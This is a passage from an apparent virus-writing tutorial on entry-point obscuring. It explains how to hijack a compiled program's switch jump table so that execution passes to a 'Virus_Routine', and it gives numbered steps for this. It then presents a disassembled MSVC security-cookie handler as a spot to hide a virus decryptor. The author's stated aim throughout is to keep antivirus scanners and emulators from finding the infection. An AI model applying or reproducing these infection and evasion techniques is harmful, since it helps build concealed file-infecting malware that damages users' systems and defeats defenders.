&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">JMP</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: #339933;">+</span>5DF308<span style="color: black;">&#93;</span> <span style="color: black; font-style: italic;">; eax==2</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; case <span style="color: #ff0000;">3</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">JMP</span> <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: #339933;">+</span>5DF308<span style="color: black;">&#93;</span> <span style="color: black; font-style: italic;">; eax==3</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; case else<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">JA</span> pagebree<span style="color: #339933;">.</span>005DF2CE<br/>
end select<br/>
&nbsp;</div>
<p>and in the place 5DF308 there is a list of pointers to code that should run for every case</p>
<pre class="source">
pagebree.005DF214
pagebree.005DF22F
pagebree.005DF24A
</pre>
<p>And for "case else" that's the code for it</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CMP</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Switch (cases 0..4)</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">JA</span>&nbsp; &nbsp; &nbsp; pagebree<span style="color: #339933;">.</span>005DF2CE<br/>
&nbsp;</div>
<p>If eax become bigger than all cases the execution flow will go to pagebree.005DF2CE.</p>
<p>Now let's talk about using this trick. I think you know how we will use this trick we will place our Virus_Routine in the middle of this list</p>
<p>We will do this:</p>
<ol>
<li>First search for mov eax,imm8 jA ptr and then jmp (eax*4 +disp32)</li>
<li>second we will go the disp32 and check there are all pointers from 1st dword to imm8 dword (from 0 to imm8 that moved to eax (mov eax,imm8))</li>
<li>get a random number between 0 to imm8 and write our Virus_Routine pointer and don't forget to save the Old_Pointer that you overwrite</li>
<li>the virus should begin by pushad and end with popad and jmp Old_Pointer</li>
</ol>
<p>It's not hard EPO to use and not so hard to find but with normal searching they will not find your virus and they will need to nd every jmp [eax*4 +disp32] and check for all pointers in disp32 and this is more harder than Griyo EPO and more easier for you to use.</p>
<p>I think I reach the end for obfuscating your Virus_Routine Pointer with some good tricks to use. But you ask me what to choose?</p>
<p>I will tell you choose your mind you idea and your creativity and search for an irreversible idea that makes Avers can't search for it and miss your Virus_Routine forever and stop the Emulation all over. And don't forget all these ideas I create just for you use them or use a combination of them to create your own Style for your Virus</p>
<p>We will now jump into write a piece of code in the middle of the host like a decryptor or something. So why we still talking let's go</p>
<h3><a name="c43"></a>4.3 Security Check Cookie EPO</h3>
<p>We will now talk about finding a place to hide our code. As I say before the static blocks of code EPO is simply searching for the Static code that was written for initialization, loading libraries or modules or for Security and this time we will talk about security</p>
<p>I found a piece of code created for security. It's created for Buffer Overflow attacks to secure the return value from being overwritten (as I think) and I think it's fit our decryptor. That its code:</p>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #adadad; font-style: italic;">01856075</span> <span style="color: #339933;">/</span>&gt; <span style="color: #ff0000;">55</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EBP</span><br/>
<span style="color: #adadad; font-style: italic;">01856076</span> |<span style="color: #339933;">.</span> 8BEC&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ESP</span><br/>
<span style="color: #adadad; font-style: italic;">01856078</span> |<span style="color: #339933;">.</span> 81EC <span style="color: #ff0000;">28030000</span> &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">SUB</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ESP</span><span style="color: #339933;">,</span><span style="color: #ff0000;">328</span><br/>
<span style="color: #adadad; font-style: italic;">0185607E</span> |<span style="color: #339933;">.</span> A3 80CC9301 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC80<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EAX</span><br/>
<span style="color: #adadad; font-style: italic;">01856083</span> |<span style="color: #339933;">.</span> 890D 7CCC9301 &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC7C<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ECX</span><br/>
<span style="color: #adadad; font-style: italic;">01856089</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">8915</span> 78CC9301 &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC78<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EDX</span><br/>
<span style="color: #adadad; font-style: italic;">0185608F</span> |<span style="color: #339933;">.</span> 891D 74CC9301 &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC74<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EBX</span><br/>
<span style="color: #adadad; font-style: italic;">01856095</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">8935</span> 70CC9301 &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC70<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ESI</span><br/>
<span style="color: #adadad; font-style: italic;">0185609B</span> |<span style="color: #339933;">.</span> 893D 6CCC9301 &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC6C<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EDI</span><br/>
<span style="color: #adadad; font-style: italic;">018560A1</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span>8C15 98CC93&nbsp; &nbsp; &nbsp; &gt;<span style="color: #00007f; font-weight: bold;">MOV</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC98<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">SS</span><br/>
<span style="color: #adadad; font-style: italic;">018560A8</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span>8C0D 8CCC93&nbsp; &nbsp; &nbsp; &gt;<span style="color: #00007f; font-weight: bold;">MOV</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC8C<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">CS</span><br/>
<span style="color: #adadad; font-style: italic;">018560AF</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span>8C1D 68CC93&nbsp; &nbsp; &nbsp; &gt;<span style="color: #00007f; font-weight: bold;">MOV</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC68<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">DS</span><br/>
<span style="color: #adadad; font-style: italic;">018560B6</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span>8C05 64CC93&nbsp; &nbsp; &nbsp; &gt;<span style="color: #00007f; font-weight: bold;">MOV</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC64<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ES</span><br/>
<span style="color: #adadad; font-style: italic;">018560BD</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span>8C25 60CC93&nbsp; &nbsp; &nbsp; &gt;<span style="color: #00007f; font-weight: bold;">MOV</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC60<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">FS</span><br/>
<span style="color: #adadad; font-style: italic;">018560C4</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">66</span><span style="color: #339933;">:</span>8C2D 5CCC93&nbsp; &nbsp; &nbsp; &gt;<span style="color: #00007f; font-weight: bold;">MOV</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">WORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC5C<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">GS</span><br/>
<span style="color: #adadad; font-style: italic;">018560CB</span> |<span style="color: #339933;">.</span> 9C&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSHFD</span><br/>
<span style="color: #adadad; font-style: italic;">018560CC</span> |<span style="color: #339933;">.</span> 8F05 90CC9301 &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">POP</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC90<span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">018560D2</span> |<span style="color: #339933;">.</span> 8B45 <span style="color: #ff0000;">00</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">018560D5</span> |<span style="color: #339933;">.</span> A3 84CC9301 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC84<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EAX</span><br/>
<span style="color: #adadad; font-style: italic;">018560DA</span> |<span style="color: #339933;">.</span> 8B45 <span style="color: #ff0000;">04</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">018560DD</span> |<span style="color: #339933;">.</span> A3 88CC9301 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC88<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EAX</span><br/>
<span style="color: #adadad; font-style: italic;">018560E2</span> |<span style="color: #339933;">.</span> 8D45 <span style="color: #ff0000;">08</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">LEA</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">+</span><span style="color: #ff0000;">8</span><span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">018560E5</span> |<span style="color: #339933;">.</span> A3 94CC9301 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC94<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EAX</span><br/>
<span style="color: #adadad; font-style: italic;">018560EA</span> |<span style="color: #339933;">.</span> 8B85 E0FCFFFF &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">-</span><span style="color: #ff0000;">320</span><span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">018560F0</span> |<span style="color: #339933;">.</span> C705 D0CB9301 &nbsp; &nbsp; &nbsp; &gt;<span style="color: #00007f; font-weight: bold;">MOV</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CBD0<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10001</span><br/>
<span style="color: #adadad; font-style: italic;">018560FA</span> |<span style="color: #339933;">.</span> A1 88CC9301 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CC88<span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">018560FF</span> |<span style="color: #339933;">.</span> A3 84CB9301 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CB84<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EAX</span><br/>
<span style="color: #adadad; font-style: italic;">01856104</span> |<span style="color: #339933;">.</span> C705 78CB9301 &nbsp; &nbsp; &nbsp; &gt;<span style="color: #00007f; font-weight: bold;">MOV</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CB78<span style="color: black;">&#93;</span><span style="color: #339933;">,</span>C0000409<br/>
<span style="color: #adadad; font-style: italic;">0185610E</span> |<span style="color: #339933;">.</span> C705 7CCB9301 &nbsp; &nbsp; &nbsp; &gt;<span style="color: #00007f; font-weight: bold;">MOV</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CB7C<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br/>
<span style="color: #adadad; font-style: italic;">01856118</span> |<span style="color: #339933;">.</span> A1 70AB9301 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193AB70<span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">0185611D</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">8985</span> D8FCFFFF &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">-</span><span style="color: #ff0000;">328</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EAX</span><br/>
<span style="color: #adadad; font-style: italic;">01856123</span> |<span style="color: #339933;">.</span> A1 74AB9301 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193AB74<span style="color: black;">&#93;</span><br/>
<span style="color: #adadad; font-style: italic;">01856128</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">8985</span> DCFCFFFF &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">SS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">EBP</span><span style="color: #339933;">-</span><span style="color: #ff0000;">324</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EAX</span><br/>
<span style="color: #adadad; font-style: italic;">0185612E</span> |<span style="color: #339933;">.</span> FF15 80008F01 &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CALL</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>&lt;&amp;KERNEL32<span style="color: #339933;">.</span>IsDebugger&gt;<span style="color: black; font-style: italic;">; [IsDebuggerPresent</span><br/>
<span style="color: #adadad; font-style: italic;">01856134</span> |<span style="color: #339933;">.</span> A3 C8CB9301 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">MOV</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CBC8<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">EAX</span><br/>
<span style="color: #adadad; font-style: italic;">01856139</span> |<span style="color: #339933;">.</span> 6A <span style="color: #ff0000;">01</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #ff0000;">1</span><br/>
<span style="color: #adadad; font-style: italic;">0185613B</span> |<span style="color: #339933;">.</span> E8 <span style="color: #ff0000;">0E030000</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CALL</span>&nbsp; &nbsp; &lt;<span style="color: #00007f; font-weight: bold;">JMP</span><span style="color: #339933;">.</span>&amp;MSVCR80<span style="color: #339933;">.</span>_crt_debugger_hook&gt;<br/>
<span style="color: #adadad; font-style: italic;">01856140</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">59</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">POP</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ECX</span><br/>
<span style="color: #adadad; font-style: italic;">01856141</span> |<span style="color: #339933;">.</span> 6A <span style="color: #ff0000;">00</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; /pTopLevelFilter = NULL</span><br/>
<span style="color: #adadad; font-style: italic;">01856143</span> |<span style="color: #339933;">.</span> FF15 84008F01 &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CALL</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>&lt;&amp;KERNEL32<span style="color: #339933;">.</span>SetUnhandl&gt;&nbsp; &nbsp; <span style="color: black; font-style: italic;">; \SetUnhandledExceptionFilter</span><br/>
<span style="color: #adadad; font-style: italic;">01856149</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">68</span> 3C129001 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; dRasterM<span style="color: #339933;">.</span>0190123C &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; /pExceptionInfo = dRasterM.0190123C</span><br/>
<span style="color: #adadad; font-style: italic;">0185614E</span> |<span style="color: #339933;">.</span> FF15 88008F01 &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CALL</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>&lt;&amp;KERNEL32<span style="color: #339933;">.</span>UnhandledE&gt;&nbsp; &nbsp; <span style="color: black; font-style: italic;">; \UnhandledExceptionFilter</span><br/>
<span style="color: #adadad; font-style: italic;">01856154</span> |<span style="color: #339933;">.</span> 833D C8CB9301 &nbsp; &nbsp; &nbsp; &gt;<span style="color: #00007f; font-weight: bold;">CMP</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>193CBC8<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
<span style="color: #adadad; font-style: italic;">0185615B</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">75</span> <span style="color: #ff0000;">08</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">JNZ</span> &nbsp; &nbsp; SHORT dRasterM<span style="color: #339933;">.</span>01856165<br/>
<span style="color: #adadad; font-style: italic;">0185615D</span> |<span style="color: #339933;">.</span> 6A <span style="color: #ff0000;">01</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #ff0000;">1</span><br/>
<span style="color: #adadad; font-style: italic;">0185615F</span> |<span style="color: #339933;">.</span> E8 EA020000 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CALL</span>&nbsp; &nbsp; &lt;<span style="color: #00007f; font-weight: bold;">JMP</span><span style="color: #339933;">.</span>&amp;MSVCR80<span style="color: #339933;">.</span>_crt_debugger_hook&gt;<br/>
<span style="color: #adadad; font-style: italic;">01856164</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">59</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">POP</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ECX</span><br/>
<span style="color: #adadad; font-style: italic;">01856165</span> |&gt; <span style="color: #ff0000;">68</span> 090400C0 &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; C0000409<br/>
<span style="color: #adadad; font-style: italic;">0185616A</span> |<span style="color: #339933;">.</span> FF15 F0008F01 &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CALL</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>&lt;&amp;KERNEL32<span style="color: #339933;">.</span>GetCurrent&gt;&nbsp; &nbsp; <span style="color: black; font-style: italic;">; |[GetCurrentProcess</span><br/>
<span style="color: #adadad; font-style: italic;">01856170</span> |<span style="color: #339933;">.</span> <span style="color: #ff0000;">50</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">PUSH</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">EAX</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; |hProcess</span><br/>
<span style="color: #adadad; font-style: italic;">01856171</span> |<span style="color: #339933;">.</span> FF15 EC008F01 &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">CALL</span>&nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">DWORD</span> PTR <span style="color: #46aa03; font-weight: bold;">DS</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span>&lt;&amp;KERNEL32<span style="color: #339933;">.</span>TerminateP&gt;&nbsp; &nbsp; <span style="color: black; font-style: italic;">; \TerminateProcess</span><br/>
